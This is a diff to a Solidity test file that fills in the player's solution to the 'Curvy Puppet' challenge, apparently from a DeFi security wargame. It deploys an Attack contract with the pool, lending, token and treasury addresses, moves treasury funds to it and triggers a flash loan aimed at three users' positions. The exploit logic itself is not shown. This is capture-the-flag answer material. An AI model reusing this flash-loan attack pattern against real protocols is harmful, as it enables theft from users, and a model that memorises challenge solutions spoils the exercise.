@@ -10,6 +10,8 @@ import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLend
 import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
 import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
 
+import {Attack} from "./Attack.t.sol";
+
 contract CurvyPuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -158,7 +160,15 @@ contract CurvyPuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        
+        address[] memory users = new address[](3);
+        users[0] = alice;
+        users[1] = bob;
+        users[2] = charlie;
+
+        Attack attack = new Attack(permit2, curvePool, lending, stETH, weth, curvePool.lp_token(), dvt, treasury, TREASURY_WETH_BALANCE, users);
+        IERC20(curvePool.lp_token()).transferFrom(treasury, address(attack), TREASURY_LP_BALANCE - 1);
+        weth.transferFrom(treasury, address(attack), TREASURY_WETH_BALANCE - 1);
+        attack.flashLoan();
     }
 
     /**
